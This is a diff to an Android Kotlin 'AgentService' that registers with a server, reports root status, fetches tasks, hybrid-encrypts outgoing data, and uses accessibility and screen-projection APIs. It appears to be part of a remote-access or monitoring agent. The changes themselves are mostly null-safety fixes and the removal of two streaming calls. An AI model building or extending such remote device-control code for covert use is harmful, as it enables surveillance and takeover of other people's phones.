@@ -37,6 +37,7 @@ import android.view.accessibility.AccessibilityNodeInfo
 import androidx.annotation.RequiresApi
 import com.google.gson.Gson
 import com.google.gson.reflect.TypeToken
+import com.system.monitor.capabilities.*
 import java.io.*
 import java.net.HttpURLConnection
 import java.net.URL
@@ -80,7 +81,7 @@ class AgentService : Service() {
     private var frameRate = 15
     private var quality = 70
     private var scale = 1.0f
-    private var accessibilityService: RemoteAccessibilityService? = null
+    private var remoteAccessibilityService: RemoteAccessibilityService? = null
 
     inner class LocalBinder : Binder() {
         fun getService(): AgentService = this@AgentService
@@ -170,7 +171,7 @@ class AgentService : Service() {
             "privileged" to isRooted().toString()
         )
         val resp = post("/register", payload)
-        resp?.let { agentId = it["agent_id"] as String? }
+        resp?.let { agentId = it["agent_id"] as? String }
     }
 
     private fun fetchTasks(): List<Task> {
@@ -222,9 +223,9 @@ class AgentService : Service() {
         val cipher = Cipher.getInstance("AES/GCM/NoPadding")
         val nonce = ByteArray(12)
         SecureRandom().nextBytes(nonce)
-        cipher.init(Cipher.ENCRYPT_MODE, aesKey, GCMParameterSpec(128, nonce))
+        cipher.init(Cipher.ENCRYPT_MODE, aesKey!!, GCMParameterSpec(128, nonce))
         val encrypted = cipher.doFinal(data)
-        val encryptedKey = encryptRSA(aesKey.encoded)
+        val encryptedKey = encryptRSA(aesKey!!.encoded)
         return encryptedKey + nonce + encrypted
     }
 
@@ -242,7 +243,7 @@ class AgentService : Service() {
 
     private fun encryptRSA(data: ByteArray): ByteArray {
         val cipher = Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding")
-        cipher.init(Cipher.ENCRYPT_MODE, rsaPublicKey)
+        cipher.init(Cipher.ENCRYPT_MODE, rsaPublicKey!!)
         return cipher.doFinal(data)
     }
 
@@ -279,8 +280,6 @@ class AgentService : Service() {
         }
         val projectionMgr = getSystemService(MediaProjectionManager::class.java)
         projection = projectionMgr.getMediaProjection(resultCode, data)
-        setupVirtualDisplay()
-        startStreaming()
     }
 
     override fun onBind(intent: Intent): IBinder = binder
